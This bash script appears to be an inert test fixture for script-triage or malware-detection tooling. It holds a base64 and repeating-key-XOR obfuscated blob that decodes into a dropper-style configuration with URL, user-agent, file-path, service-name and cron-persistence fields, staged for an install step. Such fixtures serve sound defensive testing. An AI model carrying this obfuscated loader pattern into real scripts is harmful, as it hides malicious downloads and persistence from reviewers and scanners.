#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_d108f2ca='lmqBXDCUMsBTfoQy008nhQjVTSGFM9RFJ8wgwkk3hQjWSS+FK9FEIpAj1VJ+gjbDRXXUCNRFII8z1X8xhTPZUiaDI8xTN4Ew1X8gjyLeVH7RK9NBLpA22Uctvz7UHSCBOsBBKoc5nUJx2WXVRHvZZYNcJYk71X8zgSPYHWyUOsAPK5U5xFImkySdQyKDP9UPbZMj0UcmzTWCGXGFM4gZcdM='
readonly Codec_d108f2ca='base64_literal|repeating_key_xor|e0,57,b0,20,43'

Load_d108f2ca() {
  item1=()
  local item6
  while read -r item6; do [[ -n "$item6" ]] && item1+=("$item6"); done < <(printf '%s' "${Material_d108f2ca}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_d108f2ca() {
  item2=()
  local -a key_bytes=(224 87 176 32 67)
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$((item1[item5] ^ key_bytes[item5 % ${#key_bytes[@]}]))")
  done
}

Recover_d108f2ca() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_d108f2ca
  for item8 in 1; do Decode_d108f2ca; done
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_d108f2ca() { Recover_d108f2ca; }

Plan_d108f2ca() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_d108f2ca)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a decoder=(base64 --decode) destination=(install -m 0600 /dev/stdin "$file_path")
  declare -p decoder destination
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_d108f2ca; fi
